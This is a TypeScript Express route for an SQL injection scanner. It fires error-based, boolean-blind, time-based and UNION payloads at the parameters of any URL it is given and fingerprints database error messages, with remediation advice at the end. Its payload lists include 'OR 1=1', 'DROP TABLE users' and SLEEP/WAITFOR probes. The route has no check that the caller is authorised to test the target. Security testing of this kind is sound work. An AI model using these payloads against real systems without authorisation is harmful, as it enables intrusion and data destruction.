// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
/**
 * SQL Injection Scanner
 * Tests URL parameters for error-based, boolean-blind, time-based, and UNION-based SQLi.
 * All probes are real outbound HTTP requests — no simulated data.
 */
import { Router, type Request, type Response } from "express";
import { z } from "zod";
import https from "https";
import http from "http";
import { URL } from "url";

const router = Router();

// ── SQL error fingerprints per DB engine ──────────────────────────────────────
const DB_ERRORS: Array<{ db: string; patterns: RegExp[] }> = [
  {
    db: "MySQL",
    patterns: [
      /you have an error in your sql syntax/i,
      /warning: mysql/i,
      /unclosed quotation mark after the character string/i,
      /mysql_fetch_array\(\)/i,
      /supplied argument is not a valid mysql/i,
      /mysql_num_rows\(\)/i,
      /com\.mysql\.jdbc/i,
      /Zend_Db_(Adapter|Statement)_Mysqli_Exception/i,
    ],
  },
  {
    db: "PostgreSQL",
    patterns: [
      /pg_query\(\)/i,
      /pg_exec\(\)/i,
      /postgresql.*error/i,
      /error:.*syntax error at or near/i,
      /org\.postgresql\.util\.PSQLException/i,
      /unterminated quoted string at or near/i,
      /invalid input syntax for (type )?integer/i,
    ],
  },
  {
    db: "MSSQL",
    patterns: [
      /unclosed quotation mark after the character string/i,
      /incorrect syntax near/i,
      /microsoft sql server/i,
      /microsoft ole db provider for sql server/i,
      /mssql_query\(\)/i,
      /syntax error converting the varchar value/i,
      /SqlException/i,
    ],
  },
  {
    db: "Oracle",
    patterns: [
      /ora-[0-9]{4,5}/i,
      /oracle error/i,
      /oracle.*driver/i,
      /quoted string not properly terminated/i,
      /ORA-01756/i,
    ],
  },
  {
    db: "SQLite",
    patterns: [
      /sqlite_master/i,
      /sqlite error/i,
      /unrecognized token/i,
      /no such column/i,
      /sqlite3\.OperationalError/i,
    ],
  },
];

// ── Payload sets ──────────────────────────────────────────────────────────────
const ERROR_PAYLOADS = [
  "'",
  "''",
  "`",
  '"',
  "\\",
  "1'",
  "1\"",
  "1`",
  "1\\",
  "' OR '1'='1",
  "' OR 1=1--",
  "' OR 1=1#",
  "' OR 1=1/*",
  "admin'--",
  "' AND 1=CONVERT(int,@@version)--",
  "'; SELECT 1--",
  "1; DROP TABLE users--",
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' AND 1=1--",
  "' AND 1=2--",
];

const BOOLEAN_PAIRS: Array<[string, string]> = [
  ["1 AND 1=1", "1 AND 1=2"],
  ["1' AND '1'='1", "1' AND '1'='2"],
  ["1 OR 1=1", "1 OR 1=2"],
  ["true", "false"],
  ["1 AND 2>1", "1 AND 2<1"],
];

const TIME_PAYLOADS: Array<{ payload: string; db: string; sleepSecs: number }> = [
  { payload: "1; SELECT SLEEP(4)--", db: "MySQL", sleepSecs: 4 },
  { payload: "1' AND SLEEP(4)--", db: "MySQL", sleepSecs: 4 },
  { payload: "1; SELECT pg_sleep(4)--", db: "PostgreSQL", sleepSecs: 4 },
  { payload: "1'; SELECT pg_sleep(4)--", db: "PostgreSQL", sleepSecs: 4 },
  { payload: "1; WAITFOR DELAY '0:0:4'--", db: "MSSQL", sleepSecs: 4 },
  { payload: "1'; WAITFOR DELAY '0:0:4'--", db: "MSSQL", sleepSecs: 4 },
];

// ── HTTP fetch helper ─────────────────────────────────────────────────────────
interface FetchResult {
  status: number;
  body: string;
  latencyMs: number;
  headers: Record<string, string>;
}

function fetchUrl(urlStr: string, timeoutMs = 10000): Promise<FetchResult | null> {
  return new Promise(resolve => {
    const start = Date.now();
    try {
      const parsed = new URL(urlStr);
      const mod = parsed.protocol === "https:" ? https : http;
      const req = mod.request(
        {
          host: parsed.hostname,
          path: parsed.pathname + (parsed.search || ""),
          port: parsed.port || (parsed.protocol === "https:" ? 443 : 80),
          method: "GET",
          headers: {
            "User-Agent": "Mozilla/5.0 (compatible; ProxhqVPN-SQLiScanner/1.0)",
            "Accept": "text/html,application/xhtml+xml,application/json,*/*",
            "Connection": "close",
          },
          timeout: timeoutMs,
          rejectUnauthorized: false,
        },
        res => {
          const headers: Record<string, string> = {};
          for (const [k, v] of Object.entries(res.headers)) {
            if (typeof v === "string") headers[k.toLowerCase()] = v;
            else if (Array.isArray(v)) headers[k.toLowerCase()] = v[0];
          }
          const chunks: Buffer[] = [];
          res.on("data", (c: Buffer) => { if (chunks.reduce((a, b) => a + b.length, 0) < 65536) chunks.push(c); });
          res.on("end", () => {
            resolve({
              status: res.statusCode || 0,
              body: Buffer.concat(chunks).toString("utf8", 0, 65536),
              latencyMs: Date.now() - start,
              headers,
            });
          });
          res.on("error", () => resolve(null));
        }
      );
      req.on("error", () => resolve(null));
      req.on("timeout", () => { req.destroy(); resolve(null); });
      req.end();
    } catch {
      resolve(null);
    }
  });
}

// ── DB fingerprint from response body ─────────────────────────────────────────
function fingerprintDb(body: string): string | null {
  for (const { db, patterns } of DB_ERRORS) {
    for (const pat of patterns) {
      if (pat.test(body)) return db;
    }
  }
  return null;
}

// ── Inject payload into a specific param of a URL ────────────────────────────
function injectParam(urlStr: string, param: string, payload: string): string {
  const u = new URL(urlStr);
  u.searchParams.set(param, payload);
  return u.toString();
}

// ── Main scan route ───────────────────────────────────────────────────────────
router.post("/scan", async (req: Request, res: Response) => {
  const body = z.object({
    url: z.string().url().max(2000),
    params: z.array(z.string()).optional(),
    checks: z.object({
      errorBased: z.boolean().default(true),
      booleanBlind: z.boolean().default(true),
      timeBased: z.boolean().default(true),
      union: z.boolean().default(true),
    }).optional(),
  }).safeParse(req.body);

  if (!body.success) return res.status(400).json({ error: "Invalid input", details: body.error.issues });

  const targetUrl = body.data.url;
  const checks = body.data.checks ?? { errorBased: true, booleanBlind: true, timeBased: true, union: true };

  // Auto-detect parameters from URL if not specified
  let params = body.data.params ?? [];
  if (params.length === 0) {
    const parsed = new URL(targetUrl);
    params = [...parsed.searchParams.keys()];
  }
  if (params.length === 0) {
    return res.status(400).json({ error: "No URL parameters detected. Add ?param=value to the URL or specify params manually." });
  }
  params = params.slice(0, 8); // cap at 8 params

  // Baseline request
  const baseline = await fetchUrl(targetUrl, 8000);
  if (!baseline) {
    return res.status(502).json({ error: "Target URL is unreachable or timed out" });
  }

  const findings: Array<{
    param: string;
    type: "error_based" | "boolean_blind" | "time_based" | "union";
    payload: string;
    db: string | null;
    confidence: "confirmed" | "likely" | "possible";
    detail: string;
    evidence: string;
  }> = [];

  for (const param of params) {
    // ── Error-based probes ──
    if (checks.errorBased) {
      for (const payload of ERROR_PAYLOADS.slice(0, 12)) {
        const injectedUrl = injectParam(targetUrl, param, payload);
        const result = await fetchUrl(injectedUrl, 7000);
        if (!result) continue;
        const db = fingerprintDb(result.body);
        if (db) {
          // Extract a snippet from the body as evidence
          const errIdx = DB_ERRORS.find(d => d.db === db)?.patterns
            .map(p => { const m = result.body.match(p); return m ? m[0] : null; })
            .find(Boolean) ?? null;
          findings.push({
            param,
            type: "error_based",
            payload,
            db,
            confidence: "confirmed",
            detail: `${db} error message triggered — parameter is unsanitized`,
            evidence: errIdx ?? result.body.slice(0, 200),
          });
          break; // One confirmed finding per param is enough for error-based
        }
        // Check for generic SQL keywords in response that weren't in baseline
        const genericSqlInResponse = /syntax error|sql error|warning.*sql|exception.*sql|database error|odbc error/i.test(result.body) &&
          !/syntax error|sql error|warning.*sql|exception.*sql|database error|odbc error/i.test(baseline.body);
        if (genericSqlInResponse) {
          findings.push({
            param,
            type: "error_based",
            payload,
            db: null,
            confidence: "likely",
            detail: "Generic SQL error message appeared in response after injection",
            evidence: result.body.slice(0, 200),
          });
          break;
        }
      }
    }

    // ── Boolean-blind probes ──
    if (checks.booleanBlind) {
      for (const [truePayload, falsePayload] of BOOLEAN_PAIRS.slice(0, 4)) {
        const trueUrl = injectParam(targetUrl, param, truePayload);
        const falseUrl = injectParam(targetUrl, param, falsePayload);
        const [trueRes, falseRes] = await Promise.all([
          fetchUrl(trueUrl, 7000),
          fetchUrl(falseUrl, 7000),
        ]);
        if (!trueRes || !falseRes) continue;
        const lenDiff = Math.abs(trueRes.body.length - falseRes.body.length);
        const baseLen = baseline.body.length;
        // Significant response length difference between true/false conditions
        if (lenDiff > 50 && (trueRes.body.length > baseLen * 0.8 || falseRes.body.length < baseLen * 0.5)) {
          findings.push({
            param,
            type: "boolean_blind",
            payload: `TRUE: ${truePayload} | FALSE: ${falsePayload}`,
            db: null,
            confidence: "likely",
            detail: `Response length differs by ${lenDiff} bytes between true/false conditions (baseline: ${baseLen}B, true: ${trueRes.body.length}B, false: ${falseRes.body.length}B)`,
            evidence: `TRUE response: ${trueRes.status} ${trueRes.body.length}B | FALSE response: ${falseRes.status} ${falseRes.body.length}B`,
          });
          break;
        }
        // Status code difference
        if (trueRes.status !== falseRes.status && trueRes.status === baseline.status) {
          findings.push({
            param,
            type: "boolean_blind",
            payload: `TRUE: ${truePayload} | FALSE: ${falsePayload}`,
            db: null,
            confidence: "possible",
            detail: `HTTP status changes between true/false conditions (${trueRes.status} vs ${falseRes.status})`,
            evidence: `Baseline: ${baseline.status} | TRUE: ${trueRes.status} | FALSE: ${falseRes.status}`,
          });
          break;
        }
      }
    }

    // ── Time-based blind probes ──
    if (checks.timeBased) {
      for (const { payload, db, sleepSecs } of TIME_PAYLOADS.slice(0, 4)) {
        const injectedUrl = injectParam(targetUrl, param, payload);
        const start = Date.now();
        const result = await fetchUrl(injectedUrl, (sleepSecs + 4) * 1000);
        const elapsed = Date.now() - start;
        if (!result) continue;
        const expectedMs = sleepSecs * 1000;
        if (elapsed >= expectedMs * 0.85 && elapsed <= (sleepSecs + 3) * 1000) {
          findings.push({
            param,
            type: "time_based",
            payload,
            db,
            confidence: elapsed >= expectedMs ? "confirmed" : "likely",
            detail: `Response delayed by ${(elapsed / 1000).toFixed(1)}s (expected ≥${sleepSecs}s for ${db} SLEEP injection)`,
            evidence: `Baseline latency: ${baseline.latencyMs}ms | Injected latency: ${elapsed}ms`,
          });
          break;
        }
      }
    }

    // ── UNION-based probes ──
    if (checks.union) {
      const unionPayloads = [
        `' UNION SELECT NULL--`,
        `' UNION SELECT NULL,NULL--`,
        `' UNION SELECT NULL,NULL,NULL--`,
        `' UNION SELECT 1--`,
        `' UNION SELECT 1,2--`,
        `' UNION SELECT 1,2,3--`,
        `1 UNION SELECT NULL--`,
        `1 UNION ALL SELECT NULL--`,
      ];
      for (const payload of unionPayloads) {
        const injectedUrl = injectParam(targetUrl, param, payload);
        const result = await fetchUrl(injectedUrl, 7000);
        if (!result) continue;
        const db = fingerprintDb(result.body);
        // UNION success: response is longer (extra rows) or contains null/1 echo
        const bodyGrowth = result.body.length > baseline.body.length * 1.15;
        const unionEcho = /null|UNION|union/i.test(result.body) && !/null|UNION|union/i.test(baseline.body);
        if (db) {
          findings.push({
            param,
            type: "union",
            payload,
            db,
            confidence: "confirmed",
            detail: `UNION payload triggered ${db} error — column count probing possible`,
            evidence: result.body.slice(0, 200),
          });
          break;
        }
        if (bodyGrowth && unionEcho) {
          findings.push({
            param,
            type: "union",
            payload,
            db: null,
            confidence: "possible",
            detail: `Response grew by ${((result.body.length / baseline.body.length - 1) * 100).toFixed(0)}% after UNION payload — possible extra row returned`,
            evidence: `Baseline: ${baseline.body.length}B | Injected: ${result.body.length}B`,
          });
          break;
        }
      }
    }
  }

  // Deduplicate: one finding per (param, type) combination, keep highest confidence
  const confidenceRank: Record<string, number> = { confirmed: 3, likely: 2, possible: 1 };
  const deduped = new Map<string, typeof findings[number]>();
  for (const f of findings) {
    const key = `${f.param}:${f.type}`;
    const existing = deduped.get(key);
    if (!existing || (confidenceRank[f.confidence] ?? 0) > (confidenceRank[existing.confidence] ?? 0)) {
      deduped.set(key, f);
    }
  }

  const results = [...deduped.values()];
  const detectedDbs = [...new Set(results.map(r => r.db).filter(Boolean))];
  const confirmedParams = [...new Set(results.filter(r => r.confidence === "confirmed").map(r => r.param))];

  // Risk level
  const risk = results.some(r => r.confidence === "confirmed") ? "critical"
    : results.some(r => r.confidence === "likely") ? "high"
    : results.length > 0 ? "medium"
    : "none";

  return res.json({
    url: targetUrl,
    params,
    baselineStatus: baseline.status,
    baselineLength: baseline.body.length,
    baselineLatencyMs: baseline.latencyMs,
    findings: results,
    totalFindings: results.length,
    detectedDbs,
    confirmedParams,
    risk,
    vulnerable: results.length > 0,
    summary: risk === "none"
      ? "No SQL injection vulnerabilities detected on tested parameters"
      : `${results.length} potential SQLi finding(s) across ${confirmedParams.length > 0 ? confirmedParams.join(", ") : "tested"} parameter(s) — DB: ${detectedDbs.join(", ") || "unknown"}`,
    remediation: [
      "Use parameterized queries / prepared statements — never concatenate user input into SQL",
      "Implement an ORM (Sequelize, Drizzle, Hibernate) that handles escaping automatically",
      "Apply strict input validation and allowlisting on all user-supplied parameters",
      "Enable a WAF rule set (ModSecurity CRS, AWS WAF SQLi rules) in front of the application",
      "Run the application DB user with least-privilege — no DROP/CREATE/FILE grants",
      "Enable database error suppression in production — never expose raw SQL errors to users",
    ],
    scannedAt: new Date().toISOString(),
  });
});

export default router;
